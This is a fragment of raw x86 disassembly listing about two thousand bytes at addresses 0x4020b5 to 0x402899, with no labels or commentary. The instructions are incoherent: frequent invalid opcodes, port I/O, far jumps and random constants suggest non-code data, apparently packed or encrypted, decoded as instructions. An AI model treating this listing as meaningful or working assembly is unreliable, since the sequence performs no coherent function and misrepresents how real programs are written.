  4020b5:	ins    DWORD PTR es:[edi],dx
  4020b6:	pop    edi
  4020b7:	xor    ch,BYTE PTR [eax]
  4020b9:	fadd   st(5),st
  4020bb:	mov    edi,0xfd65626d
  4020c0:	ja     0x4020b8
  4020c2:	adc    esi,eax
  4020c4:	cmp    DWORD PTR [esi-0x217123d],ebx
  4020ca:	cmp    al,0x80
  4020cc:	outs   dx,BYTE PTR ds:[esi]
  4020cd:	cdq    
  4020ce:	rcl    dl,1
  4020d0:	or     edi,DWORD PTR [eax+0x34]
  4020d3:	out    dx,eax
  4020d4:	jmp    0x73527e94
  4020d9:	jp     0x4020bb
  4020db:	pop    ss
  4020dc:	mov    dl,0x5f
  4020de:	mov    ch,0xfa
  4020e0:	nop
  4020e1:	inc    ebx
  4020e2:	add    DWORD PTR [edi-0x69],ecx
  4020e5:	shr    bl,0x15
  4020e8:	adc    edi,DWORD PTR [ebp+0x13da613c]
  4020ee:	sbb    cl,bl
  4020f0:	cmc    
  4020f1:	adc    DWORD PTR [esi],edi
  4020f3:	mov    dl,0x66
  4020f5:	jecxz  0x40215a
  4020f7:	push   edx
  4020f8:	aas    
  4020f9:	or     eax,0x28a52d02
  4020fe:	mov    al,ds:0x21b4482d
  402103:	shl    BYTE PTR [eax-0x2e190347],0xd2
  40210a:	pop    ss
  40210b:	sbb    edi,0x41
  40210e:	addr16 push ebp
  402110:	jmp    0x5d7a:0xa51509af
  402117:	rep outs dx,DWORD PTR ds:[esi]
  402119:	fwait
  40211a:	out    0x9f,ax
  40211d:	in     eax,0x55
  40211f:	loope  0x402164
  402121:	imul   BYTE PTR [ebx-0x1c]
  402124:	jns    0x4020f0
  402126:	dec    eax
  402128:	mov    BYTE PTR [edi+0x43],ah
  40212b:	push   eax
  40212c:	inc    edi
  40212d:	xchg   ebp,eax
  40212e:	or     WORD PTR [ebp-0x5a3e5c47],dx
  402135:	mov    eax,ds:0x28056954
  40213a:	add    cl,bh
  40213c:	dec    ebp
  40213d:	pop    ds
  40213e:	cmp    al,0x7d
  402140:	cld    
  402141:	ins    BYTE PTR es:[edi],dx
  402142:	mov    esi,edx
  402144:	sub    al,0xab
  402146:	stos   BYTE PTR es:[edi],al
  402147:	cli    
  402148:	dec    edx
  402149:	fdiv   st(6),st
  40214b:	or     eax,0xf72c183b
  402150:	sbb    eax,0x77a07537
  402155:	sahf   
  402156:	inc    ecx
  402157:	jbe    0xccf0ba08
  40215d:	jae    0x40210f
  40215f:	stos   DWORD PTR es:[edi],eax
  402160:	add    al,0xaf
  402162:	xor    ah,BYTE PTR [esi]
  402164:	lock cmp DWORD PTR [eax+0x7b6de2d9],0xb44eff15
  40216f:	cmp    BYTE PTR [ecx-0x7e],dl
  402172:	lods   al,BYTE PTR ds:[esi]
  402173:	sti    
  402174:	mov    ah,0x7
  402176:	and    DWORD PTR [eax+0x7e],0x617906db
  40217d:	loope  0x4021fb
  40217f:	fild   DWORD PTR [esi]
  402182:	adc    esp,DWORD PTR [edi-0x2d]
  402185:	nop
  402186:	fbld   TBYTE PTR [edx+ebx*8+0x312e9bf3]
  40218d:	pop    ss
  40218e:	cmp    dl,BYTE PTR [ebx-0x675a2d48]
  402194:	stos   DWORD PTR es:[edi],eax
  402195:	push   cx
  402197:	out    0x1c,al
  402199:	and    al,0x75
  40219b:	adc    edx,ebx
  40219d:	test   bl,ah
  40219f:	fwait
  4021a0:	pop    es
  4021a1:	pusha  
  4021a2:	(bad)  
  4021a3:	ja     0x4021b0
  4021a5:	int    0xab
  4021a7:	mov    esi,0x5db48be3
  4021ac:	add    eax,0x37c2cc68
  4021b1:	std    
  4021b2:	xor    ecx,esi
  4021b4:	inc    esi
  4021b5:	inc    ebx
  4021b6:	scas   eax,DWORD PTR es:[edi]
  4021b7:	or     DWORD PTR [edx+0x62],0xffffffcf
  4021bb:	pusha  
  4021bc:	push   es
  4021bd:	inc    eax
  4021be:	xor    al,0x96
  4021c0:	das    
  4021c1:	sub    BYTE PTR [edx],dh
  4021c3:	pop    edi
  4021c4:	cld    
  4021c5:	jno    0x402175
  4021c7:	out    0x86,al
  4021c9:	xchg   esp,eax
  4021ca:	int    0x17
  4021cc:	int3   
  4021cd:	int    0x5a
  4021cf:	and    BYTE PTR [edx+ecx*2],0xe1
  4021d3:	rcl    DWORD PTR [edi+0x332a3188],1
  4021d9:	int3   
  4021da:	ror    BYTE PTR [ecx-0x16af2433],1
  4021e0:	in     eax,0xa
  4021e2:	scas   eax,DWORD PTR es:[edi]
  4021e3:	push   esp
  4021e4:	stc    
  4021e5:	call   0x4bf1:0x5110658b
  4021ec:	sbb    bl,cl
  4021ee:	ror    bl,1
  4021f0:	test   al,0xd1
  4021f2:	repnz adc eax,0x95c1ac4a
  4021f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f9:	ja     0x402185
  4021fb:	push   0x70fe3e05
  402200:	xchg   BYTE PTR [eax*1-0x2ede6789],dh
  402207:	mov    eax,ds:0xf6515913
  40220c:	les    esi,FWORD PTR [edx+edx*4-0x4d]
  402210:	mov    ecx,0xe60c2ef0
  402215:	and    BYTE PTR [ebx+0x48],ch
  402218:	cli    
  402219:	inc    esp
  40221a:	test   BYTE PTR [edx-0x1a],dl
  40221d:	sub    eax,0x56fffe1f
  402222:	neg    DWORD PTR [edx]
  402224:	mov    ebx,0x70b97ca4
  402229:	inc    ecx
  40222a:	pop    ds
  40222b:	ins    DWORD PTR es:[edi],dx
  40222c:	dec    eax
  40222d:	test   edx,ebx
  40222f:	sub    al,0x18
  402231:	inc    ebp
  402232:	repnz mov ah,0xdc
  402235:	aad    0x7b
  402237:	sbb    al,bl
  402239:	push   es
  40223a:	stos   DWORD PTR es:[edi],eax
  40223b:	test   BYTE PTR [edx+eiz*8+0x427cb316],dl
  402242:	push   ss
  402243:	push   ds
  402244:	(bad)  
  402245:	pop    eax
  402246:	data16 and cl,dl
  402249:	add    al,0xef
  40224b:	sbb    eax,0x90fbfb55
  402250:	xchg   ecx,eax
  402251:	mov    eax,0xad0ad763
  402256:	sar    BYTE PTR [ebx],1
  402258:	mov    esp,0x497ab07f
  40225d:	mov    ecx,?
  40225f:	push   esi
  402260:	ins    DWORD PTR es:[edi],dx
  402261:	out    dx,al
  402262:	mov    ch,0x27
  402264:	out    0x2a,al
  402266:	hlt    
  402267:	shl    BYTE PTR [ebp+0x4f],1
  40226a:	lahf   
  40226b:	mov    ds:0xdfc7d9f3,eax
  402270:	(bad)  
  402272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402273:	add    ecx,DWORD PTR [ebx+0x7427bc1a]
  402279:	test   DWORD PTR [eax+0x302703eb],edx
  40227f:	cmp    al,0x90
  402281:	mov    edi,0xdd17be29
  402286:	mov    dh,0x8b
  402288:	adc    al,0x36
  40228a:	je     0x4022a4
  40228c:	jle    0x40224a
  40228e:	inc    edx
  40228f:	icebp  
  402290:	mov    eax,ds:0x10a4dfc6
  402295:	ret    0xd6dd
  402298:	cwde   
  402299:	dec    ecx
  40229a:	int    0x34
  40229c:	shl    BYTE PTR [edi-0x756e0520],1
  4022a2:	adc    bh,ah
  4022a4:	pop    ecx
  4022a5:	test   BYTE PTR [ebx-0x71],al
  4022a8:	mov    esp,DWORD PTR [ebp+0x6b60000]
  4022ae:	add    esp,DWORD PTR [edx+0x42]
  4022b1:	in     eax,dx
  4022b2:	push   cs
  4022b3:	les    edx,FWORD PTR [esp-0x4bb302d2]
  4022ba:	popa   
  4022bb:	bound  edi,QWORD PTR [eax]
  4022bd:	(bad)  
  4022bf:	lahf   
  4022c0:	xor    BYTE PTR [esi-0x2d],ah
  4022c3:	leave  
  4022c4:	mov    edi,DWORD PTR [ecx-0x2e]
  4022c7:	xchg   esi,eax
  4022c8:	sbb    eax,0x5c92ecb3
  4022cd:	cmp    esi,DWORD PTR [ecx-0x78b92592]
  4022d3:	jg     0x402279
  4022d5:	dec    ebp
  4022d6:	mov    WORD PTR [ebx+eax*4+0x328eb085],cs
  4022dd:	mov    edi,0x95b52b4e
  4022e2:	aaa    
  4022e3:	jnp    0x402353
  4022e5:	mov    ecx,eax
  4022e7:	aam    0x6e
  4022e9:	sub    esi,DWORD PTR [eax-0x6b]
  4022ec:	out    0x80,eax
  4022ee:	and    dl,dl
  4022f0:	inc    edi
  4022f1:	test   DWORD PTR ds:[esi],edi
  4022f4:	test   eax,0xa14a83c7
  4022f9:	sub    DWORD PTR [ecx+0x263a40f0],edx
  4022ff:	or     al,0x17
  402301:	pop    ebx
  402302:	mov    esp,0xafd2cc80
  402307:	adc    BYTE PTR [edx],ch
  402309:	xor    DWORD PTR [esi+eax*2-0x16],eax
  40230d:	inc    esp
  40230e:	ds push esi
  402310:	out    dx,al
  402311:	xor    DWORD PTR [ebp-0x2e1223c2],edi
  402317:	imul   ebp,DWORD PTR [esi+eax*4+0x4d767ade],0x30b63069
  402322:	stos   DWORD PTR es:[edi],eax
  402323:	ins    BYTE PTR es:[edi],dx
  402324:	jmp    0x40230c
  402326:	pop    edi
  402327:	or     al,0xe1
  402329:	les    esp,FWORD PTR [ebx]
  40232b:	dec    edi
  40232c:	sbb    eax,0xdd03cd7c
  402331:	pop    edi
  402332:	xchg   BYTE PTR [eax-0x1f417185],bl
  402338:	fdiv   DWORD PTR [esi]
  40233a:	mov    ds:0xf736cc97,eax
  40233f:	in     eax,0xa3
  402341:	jg     0x40238f
  402343:	das    
  402344:	sub    DWORD PTR [edx-0x6f],eax
  402347:	push   es
  402348:	xor    eax,DWORD PTR [ebx-0x65f78530]
  40234e:	adc    DWORD PTR [eax+0x23],eax
  402351:	and    bl,BYTE PTR [edi]
  402353:	aam    0x5e
  402355:	xchg   DWORD PTR [ecx],ebp
  402357:	dec    ecx
  402358:	cmp    ecx,DWORD PTR [edx+ebp*4-0x18]
  40235c:	fcmovu st,st(5)
  40235e:	adc    esi,0xfffffff0
  402361:	sub    cl,cl
  402363:	push   ss
  402364:	cs aas 
  402366:	xor    DWORD PTR [ebx+0x1661defd],0x6c
  40236d:	push   0x83aff440
  402372:	mov    esi,0xfa6389b
  402377:	cdq    
  402378:	xlat   BYTE PTR ds:[ebx]
  402379:	or     DWORD PTR [edi+0x48],ecx
  40237c:	sbb    esp,DWORD PTR [eax+0x6a5ed7e3]
  402382:	dec    edx
  402383:	mov    bh,0x4a
  402385:	jbe    0x4023a4
  402387:	pop    es
  402388:	add    DWORD PTR [ecx+edx*2],ebx
  40238b:	adc    bh,BYTE PTR [esi-0x62]
  40238e:	int    0x78
  402390:	pop    ebx
  402391:	pop    es
  402392:	aaa    
  402393:	mov    ebp,esi
  402395:	test   dh,ah
  402397:	mov    BYTE PTR [ecx-0x7810c96],ah
  40239d:	jae    0x4023ad
  40239f:	sbb    eax,0xf1d625a4
  4023a4:	ficomp DWORD PTR [ebp+0x6b]
  4023a7:	(bad)  
  4023a9:	nop
  4023aa:	aaa    
  4023ab:	int3   
  4023ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023ad:	neg    BYTE PTR [edi-0x31]
  4023b0:	sbb    eax,0xe045f582
  4023b5:	sub    DWORD PTR [ecx+0x29126429],ecx
  4023bb:	test   DWORD PTR [ebx-0x436b9964],esi
  4023c1:	scas   al,BYTE PTR es:[edi]
  4023c2:	adc    eax,0x5a22f41b
  4023c7:	arpl   sp,dx
  4023c9:	cli    
  4023ca:	in     al,dx
  4023cb:	or     BYTE PTR [edi-0x3],0x95
  4023cf:	xor    BYTE PTR [ebp-0x20581d33],0x41
  4023d6:	jle    0x4023f7
  4023d8:	out    0xad,al
  4023da:	sti    
  4023db:	mov    ecx,0xb7d76da8
  4023e0:	push   0xffffffd8
  4023e2:	jne    0x4023e5
  4023e4:	push   0xffffffe6
  4023e6:	inc    edx
  4023e7:	inc    esi
  4023e8:	lods   al,BYTE PTR ds:[esi]
  4023e9:	pop    eax
  4023ea:	rcl    esp,0xbf
  4023ed:	lods   eax,DWORD PTR ds:[esi]
  4023ee:	cmp    bl,0xc6
  4023f1:	stos   DWORD PTR es:[edi],eax
  4023f2:	xchg   ebx,eax
  4023f3:	imul   BYTE PTR [esi-0x4c]
  4023f6:	jp     0x402402
  4023f8:	in     eax,0x7d
  4023fa:	pop    edx
  4023fb:	pusha  
  4023fc:	mov    ah,cl
  4023fe:	into   
  4023ff:	adc    al,0xd7
  402401:	(bad)  
  402402:	xor    BYTE PTR [eax+0x4a42fe13],ch
  402408:	pushf  
  402409:	out    dx,eax
  40240a:	cmp    BYTE PTR [ebx],bl
  40240c:	sbb    ah,dh
  40240e:	ss cli 
  402410:	push   0x98d3f621
  402415:	inc    edx
  402416:	pop    ebx
  402417:	and    ch,BYTE PTR cs:[esi-0x759e4243]
  40241e:	stos   BYTE PTR es:[edi],al
  40241f:	iret   
  402420:	out    dx,al
  402421:	jge    0x4023a3
  402423:	xlat   BYTE PTR ds:[ebx]
  402424:	adc    dh,dl
  402426:	jge    0x4023f8
  402428:	pop    ds
  402429:	pusha  
  40242a:	fstp   DWORD PTR [edi+0x10527108]
  402430:	add    DWORD PTR [ebx+0x9],esi
  402433:	inc    edx
  402434:	sar    DWORD PTR [ebp+0x6cd9ae31],1
  40243a:	push   esp
  40243b:	(bad)  
  40243d:	scas   al,BYTE PTR es:[edi]
  40243e:	leave  
  40243f:	(bad)  
  402440:	and    ebx,DWORD PTR [ecx+0x5924922a]
  402446:	ficom  DWORD PTR [ebx-0x65a8b506]
  40244c:	dec    ebx
  40244d:	out    dx,eax
  40244e:	imul   ebx,DWORD PTR [ecx],0x1a
  402451:	loop   0x402468
  402453:	ror    BYTE PTR [ebx-0x62493c93],0x13
  40245a:	dec    ecx
  40245b:	cmp    al,0xa0
  40245d:	pop    ds
  40245e:	std    
  40245f:	mov    ebx,0xa0b9bef9
  402464:	mov    al,BYTE PTR [ebx+0x66eb9a1f]
  40246a:	mov    ds:0x4fdc483c,eax
  40246f:	push   eax
  402470:	test   al,0xbe
  402472:	fimul  WORD PTR [edx+0x46]
  402475:	jmp    0x40242d
  402477:	std    
  402478:	int3   
  402479:	out    dx,eax
  40247a:	mov    edx,0x2768c8de
  40247f:	adc    eax,0x1972061f
  402484:	fst    DWORD PTR [ebp+0x722df6a5]
  40248a:	and    al,0x13
  40248c:	xor    BYTE PTR [ecx+eax*1+0x706c06b9],al
  402493:	push   es
  402494:	jmp    0xa5bc8cc7
  402499:	xlat   BYTE PTR ds:[ebx]
  40249a:	and    BYTE PTR [esi+0x1f],bh
  40249d:	jecxz  0x40250d
  40249f:	or     edx,DWORD PTR [ebx+0x4e9c5b86]
  4024a5:	lahf   
  4024a6:	pusha  
  4024a7:	ins    DWORD PTR es:[edi],dx
  4024a8:	loop   0x4024e7
  4024aa:	adc    BYTE PTR [esi+0xb],dl
  4024ad:	popa   
  4024ae:	in     eax,0x98
  4024b0:	div    DWORD PTR [esi]
  4024b2:	xchg   edi,eax
  4024b3:	shl    ch,cl
  4024b5:	lock fdiv QWORD PTR [edx+eax*2+0x5564489a]
  4024bd:	sti    
  4024be:	add    DWORD PTR [esi-0x3a],ecx
  4024c1:	mov    eax,DWORD PTR [ebp+0x33]
  4024c4:	shl    BYTE PTR [ecx+0x22],cl
  4024c7:	fidiv  DWORD PTR [ebp-0x72]
  4024ca:	neg    WORD PTR [eax+0x6cd48b5c]
  4024d1:	clc    
  4024d2:	and    eax,0x3eab72cc
  4024d7:	jnp    0x40252a
  4024d9:	add    DWORD PTR [ebp-0x45],esi
  4024dc:	imul   esi,DWORD PTR [edi],0x7bca8c7f
  4024e2:	shr    DWORD PTR [ebp+0x5d],1
  4024e5:	dec    ebx
  4024e6:	cmc    
  4024e7:	dec    ebx
  4024e8:	aam    0x90
  4024ea:	xchg   ecx,eax
  4024eb:	push   ecx
  4024ec:	adc    edx,DWORD PTR [esi+0x6ec8e7f2]
  4024f2:	aas    
  4024f3:	test   dh,0x25
  4024f6:	add    eax,0x96132f0e
  4024fb:	int    0xc7
  4024fd:	fs inc ebx
  4024ff:	inc    ecx
  402500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402501:	inc    edi
  402502:	fild   DWORD PTR [ebx]
  402504:	aas    
  402505:	enter  0x9812,0xf6
  402509:	add    DWORD PTR [ebp+0x44],eax
  40250c:	das    
  40250d:	sahf   
  40250e:	cmp    DWORD PTR [ebx],0xffffffe5
  402511:	retf   
  402512:	imul   ebp,DWORD PTR [edi+ecx*8+0x7c],0xffffffd1
  402517:	repnz mov edx,0x182fd062
  40251d:	fst    DWORD PTR [ebp+0x54]
  402520:	repz sub eax,0x44d4c924
  402526:	mov    esp,0x19533375
  40252b:	repz dec ebp
  40252d:	ret    
  40252e:	sbb    BYTE PTR [ecx],0x40
  402531:	dec    edi
  402532:	into   
  402533:	ja     0x4024c7
  402535:	in     al,0x18
  402537:	add    al,0xc0
  402539:	fcom   DWORD PTR [esi]
  40253b:	push   es
  40253c:	jbe    0x402510
  40253e:	fs ja  0x40259e
  402541:	dec    esp
  402542:	mov    al,0x85
  402544:	pop    ds
  402545:	in     eax,0xf3
  402547:	sahf   
  402548:	sub    DWORD PTR [eax-0x40e13cea],ebp
  40254e:	jl     0x402563
  402550:	sub    esi,esp
  402552:	cmp    BYTE PTR [edx-0x22bc22f8],bl
  402558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402559:	pop    eax
  40255a:	and    dl,bh
  40255c:	inc    ebp
  40255d:	and    eax,0x9971f841
  402562:	shr    BYTE PTR [eax],1
  402564:	int3   
  402565:	pop    ebp
  402566:	add    bh,BYTE PTR [esi-0x1dac08c5]
  40256c:	sbb    BYTE PTR [edx],bh
  40256e:	push   ebp
  40256f:	sbb    dh,ah
  402571:	in     al,0x5e
  402573:	mov    ebp,0x9b131039
  402578:	jne    0x402562
  40257a:	(bad)  
  40257b:	outs   dx,DWORD PTR fs:[esi]
  40257d:	xchg   ecx,eax
  40257e:	pop    edx
  40257f:	js     0x402591
  402581:	mov    ebp,0x916838a8
  402586:	push   ebx
  402587:	sbb    eax,0x8b5fe6b9
  40258c:	int    0x34
  40258e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40258f:	sbb    BYTE PTR [edx-0x41cb5def],bh
  402595:	out    0xa9,eax
  402597:	jmp    0xcf6ed8b7
  40259c:	shl    esp,cl
  40259e:	test   al,0x7c
  4025a0:	jmp    0x8118:0x68ec2130
  4025a7:	cmovo  ecx,ecx
  4025aa:	inc    ebx
  4025ab:	pop    ebp
  4025ac:	mov    ds:0x44eb1fa3,eax
  4025b1:	test   eax,0x6e2c38d3
  4025b6:	repz mov dh,0x27
  4025b9:	sub    al,0x37
  4025bb:	fild   QWORD PTR [eax+eax*8+0x2]
  4025bf:	stc    
  4025c0:	mov    es,WORD PTR [esi]
  4025c2:	cmp    al,0x4b
  4025c4:	outs   dx,BYTE PTR ds:[esi]
  4025c5:	stc    
  4025c6:	and    ebx,esi
  4025c8:	dec    ecx
  4025c9:	in     eax,0xf
  4025cb:	ffreep st(5)
  4025cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025ce:	shl    DWORD PTR [esi+0x38],cl
  4025d1:	mov    bh,BYTE PTR [esi]
  4025d3:	jge    0x4025cf
  4025d5:	xchg   ebp,eax
  4025d6:	retf   0x4328
  4025d9:	fisttp QWORD PTR fs:[edx]
  4025dc:	(bad)  
  4025dd:	outs   dx,DWORD PTR ds:[esi]
  4025de:	fidiv  WORD PTR [edx+0xe]
  4025e1:	or     edi,DWORD PTR [ebx+0x4d49b6d5]
  4025e7:	fwait
  4025e8:	pop    esp
  4025e9:	mov    ebx,0x354cb960
  4025ee:	inc    ecx
  4025ef:	or     cl,BYTE PTR [ebp-0x70]
  4025f2:	out    dx,eax
  4025f3:	push   ds
  4025f4:	jo     0x402675
  4025f6:	out    0x8c,al
  4025f8:	nop
  4025f9:	aas    
  4025fa:	sbb    eax,0x94d210b2
  4025ff:	das    
  402600:	iret   
  402601:	xor    dl,bh
  402603:	loopne 0x4025cd
  402605:	jl     0x40259d
  402607:	pop    esi
  402608:	imul   ecx,DWORD PTR [ebp+0x67],0x58c5a31e
  40260f:	ret    0xf2eb
  402612:	jmp    0x4025f4
  402614:	addr16 pop ecx
  402616:	gs jp  0x4025e7
  402619:	mov    edx,DWORD PTR [eax-0x6b]
  40261c:	xor    DWORD PTR [edi],ebp
  40261e:	das    
  40261f:	mov    bl,0xbf
  402621:	pop    ss
  402622:	mov    esi,0x8f9c4ad5
  402627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402628:	dec    edx
  402629:	xor    BYTE PTR [edx+0x75946390],bl
  40262f:	and    al,0x52
  402631:	cmp    DWORD PTR [ebp+0x7cc2f9e1],esi
  402637:	sub    eax,DWORD PTR [ebx+0x6a]
  40263a:	sbb    eax,0x625a12eb
  40263f:	test   al,0xc6
  402641:	scas   al,BYTE PTR es:[edi]
  402642:	(bad)  
  402643:	neg    BYTE PTR [edx]
  402645:	sbb    eax,0xd0e966b
  40264a:	and    eax,0x34c3d7de
  40264f:	add    eax,0x97ff260a
  402654:	mov    ebp,0x7b838eed
  402659:	ret    
  40265a:	fld    st(0)
  40265c:	mov    ah,bh
  40265e:	push   ss
  40265f:	cmp    BYTE PTR [eax],0xcd
  402662:	push   ecx
  402663:	loope  0x4025f5
  402665:	rcr    DWORD PTR ds:0xd19f2185,0xe0
  40266c:	xchg   dh,cl
  40266e:	aam    0xea
  402670:	mov    esp,0x8d5b11fe
  402675:	cmp    eax,0x428bfc78
  40267a:	add    al,0xd6
  40267c:	pop    es
  40267d:	pushf  
  40267e:	mov    BYTE PTR [ecx],cl
  402680:	ins    BYTE PTR es:[edi],dx
  402681:	sub    BYTE PTR [esi+esi*2-0x3f],0xef
  402686:	mov    ecx,0x173b84cd
  40268b:	enter  0x9387,0x77
  40268f:	push   ss
  402690:	pop    esp
  402691:	(bad)
  402695:	sub    bh,0xaf
  402698:	add    eax,0xd795d426
  40269d:	xchg   edx,eax
  40269e:	ja     0x402707
  4026a0:	sbb    ch,0xa6
  4026a3:	pop    edx
  4026a4:	scas   al,BYTE PTR es:[edi]
  4026a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026a6:	cmp    DWORD PTR [ebx+0x68],eax
  4026a9:	lods   eax,DWORD PTR ds:[esi]
  4026aa:	xchg   DWORD PTR [ebp+0x71],esp
  4026ad:	(bad)  
  4026ae:	outs   dx,BYTE PTR ds:[esi]
  4026af:	(bad)  
  4026b0:	sub    al,0xa
  4026b2:	push   cs
  4026b3:	pop    es
  4026b4:	xchg   esp,eax
  4026b5:	nop
  4026b6:	mov    BYTE PTR [edi],dl
  4026b8:	xchg   ecx,eax
  4026b9:	and    eax,0x1543a767
  4026be:	stos   BYTE PTR es:[edi],al
  4026bf:	ret    0x7381
  4026c2:	push   ds
  4026c3:	pop    ebp
  4026c4:	jae    0x402659
  4026c6:	loope  0x40271a
  4026c8:	pusha  
  4026c9:	call   0xa66f:0xe61a
  4026cf:	fucomp st(2)
  4026d1:	mov    DWORD PTR gs:[ecx+0x0],esp
  4026d5:	dec    esi
  4026d6:	and    DWORD PTR [ecx-0x5c],edi
  4026d9:	test   dl,0xca
  4026dc:	xchg   ebx,eax
  4026dd:	std    
  4026de:	hlt    
  4026df:	cmp    ah,bl
  4026e1:	scas   al,BYTE PTR es:[edi]
  4026e2:	data16 adc BYTE PTR [ebx+0x3b],ch
  4026e6:	mov    dh,0x3d
  4026e8:	popf   
  4026e9:	js     0x402691
  4026eb:	stos   BYTE PTR es:[edi],al
  4026ec:	lahf   
  4026ed:	stos   DWORD PTR es:[edi],eax
  4026ee:	sar    DWORD PTR [edx+ebx*4+0x46655457],1
  4026f5:	jecxz  0x402689
  4026f7:	sbb    ah,BYTE PTR [edi+0x66]
  4026fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026fb:	in     eax,0x82
  4026fd:	(bad)  
  4026fe:	mov    esp,0xbb60ca0c
  402703:	push   ds
  402704:	jecxz  0x40277f
  402706:	(bad)  
  402707:	repnz and dh,BYTE PTR [ebx+0x1f]
  40270b:	dec    edx
  40270c:	jg     0x402774
  40270e:	ror    DWORD PTR [ebx-0x55],cl
  402711:	scas   al,BYTE PTR es:[edi]
  402712:	xor    esp,DWORD PTR [ebp+0x3]
  402715:	leave  
  402716:	cmp    eax,0x1032b2bd
  40271b:	fiadd  WORD PTR [ecx+0x2b6e297a]
  402721:	aad    0xf2
  402723:	cmp    ecx,ebx
  402725:	mov    DWORD PTR [esi],esi
  402727:	stos   DWORD PTR es:[edi],eax
  402728:	and    ecx,esi
  40272a:	mov    esp,0xd64a6c67
  40272f:	out    0x44,eax
  402731:	pop    ds
  402732:	mov    eax,0xe99145b2
  402737:	push   esi
  402738:	push   es
  402739:	les    ebp,FWORD PTR [eax-0x1b]
  40273c:	mov    es,esp
  40273e:	pop    esp
  40273f:	mov    eax,ds:0x3824dd2f
  402744:	aam    0x3f
  402746:	mov    ds:0xa1f11452,al
  40274b:	push   ecx
  40274c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40274d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40274e:	das    
  40274f:	push   cs
  402750:	ror    DWORD PTR [ebp-0x6d],cl
  402753:	div    ebx
  402755:	shl    BYTE PTR [edx-0x5e],cl
  402758:	ds or  al,0xfb
  40275b:	(bad)  
  40275c:	lahf   
  40275d:	add    BYTE PTR [edi+0x5c],ch
  402760:	jae    0x402723
  402762:	test   eax,0x140c91e5
  402767:	inc    esp
  402768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402769:	loope  0x402737
  40276b:	ror    edi,1
  40276d:	dec    ebp
  40276e:	push   ebp
  40276f:	adc    DWORD PTR [ebx-0x663b4ead],0x2514054a
  402779:	dec    edi
  40277a:	adc    al,0xe7
  40277c:	ja     0x40275f
  40277e:	mov    bl,0xa1
  402780:	aas    
  402781:	fsub   QWORD PTR [edi]
  402783:	fist   DWORD PTR [esi+edi*8-0x58]
  402787:	mov    ds:0x956a4df2,al
  40278c:	inc    BYTE PTR [esi]
  40278e:	lock adc DWORD PTR [ebp-0x179c5928],edx
  402795:	mov    DWORD PTR [edx+0xd],eax
  402798:	sub    ecx,DWORD PTR [eax]
  40279a:	ds test BYTE PTR cs:[edi+0x6418e5bb],ch
  4027a2:	(bad)  
  4027a4:	push   edi
  4027a5:	mov    edx,DWORD PTR [esi+0x6c08d786]
  4027ab:	jle    0x402792
  4027ad:	rcr    ebp,1
  4027af:	(bad)  
  4027b0:	int3   
  4027b1:	dec    edx
  4027b3:	mov    ds:0x6a05b97d,eax
  4027b8:	mov    BYTE PTR [edi],bh
  4027ba:	js     0x402820
  4027bc:	imul   edx,edx,0xffffffba
  4027bf:	push   edi
  4027c0:	push   0xaa1f9b7c
  4027c5:	mov    edi,0x878d62db
  4027ca:	out    0xa7,eax
  4027cc:	sbb    dh,BYTE PTR [edi+ecx*2-0x5a6f8afa]
  4027d3:	cmc    
  4027d4:	mov    ds:0xc051ca,eax
  4027d9:	cld    
  4027da:	add    al,0x6c
  4027dc:	push   esp
  4027dd:	jbe    0x402848
  4027df:	(bad)  
  4027e0:	jb     0x40283d
  4027e2:	imul   ebx,DWORD PTR [edi-0x24febbd6],0x3c21c2cd
  4027ec:	xchg   ebx,eax
  4027ed:	fiadd  WORD PTR [ecx]
  4027ef:	ror    BYTE PTR [ebp+0x19bcfc9a],0xbf
  4027f6:	or     ecx,eax
  4027f8:	sub    DWORD PTR [eax+ebp*2],esi
  4027fb:	jns    0x402866
  4027fd:	xchg   DWORD PTR [edi+0x5f98b3f6],esi
  402803:	mov    BYTE PTR [edi],ah
  402805:	inc    edx
  402806:	sbb    dh,BYTE PTR [edi-0x8]
  402809:	inc    ecx
  40280a:	retf   
  40280b:	std    
  40280c:	shl    DWORD PTR [edi+0x26],0xe
  402810:	loope  0x40282f
  402812:	xchg   edi,eax
  402813:	in     eax,dx
  402814:	sbb    al,0xf5
  402816:	fadd   QWORD PTR ds:0x92bfc42a
  40281c:	cld    
  40281d:	fadd   DWORD PTR [ebp-0x60]
  402820:	int    0xe6
  402822:	aad    0x24
  402824:	cs or  al,0x1f
  402827:	(bad)  
  402828:	outs   dx,DWORD PTR ds:[esi]
  402829:	scas   al,BYTE PTR es:[edi]
  40282a:	mov    BYTE PTR [edi],al
  40282c:	push   0x22faa123
  402831:	pop    es
  402832:	xor    edi,DWORD PTR [edi+0x3161aa18]
  402838:	ss jae 0x402838
  40283b:	dec    esp
  40283c:	jno    0x402832
  40283e:	adc    esp,DWORD PTR [esi]
  402840:	test   BYTE PTR [ebx-0x7e],0x22
  402844:	test   eax,0x33ea3cff
  402849:	xor    ebx,edi
  40284b:	les    edi,FWORD PTR [edi-0x58260a98]
  402851:	jle    0x40286c
  402853:	in     eax,dx
  402854:	jae    0x4028b8
  402856:	jno    0x402831
  402858:	mov    edx,0xb5ec26cb
  40285d:	inc    ebx
  40285e:	jmp    0x2ebb0fa9
  402863:	and    al,0xab
  402865:	or     ecx,edx
  402867:	mov    DWORD PTR [edx+eiz*8],edi
  40286a:	pop    eax
  40286b:	sbb    esp,ebp
  40286d:	enter  0xc9ab,0x40
  402871:	xor    BYTE PTR ds:0x45ef0140,dh
  402877:	or     ecx,DWORD PTR [edi-0x20]
  40287a:	retf   0x4066
  40287d:	rsm    
  40287f:	push   ebx
  402880:	add    al,0x52
  402882:	add    eax,0x7dcc0c49
  402887:	sub    DWORD PTR [ecx-0x13b799b5],0xe9d453cd
  402891:	dec    edx
  402892:	addr16 mov al,0xbc
  402895:	push   ecx
  402896:	jmp    0x402855
  402898:	(bad)  
  402899:	retf   
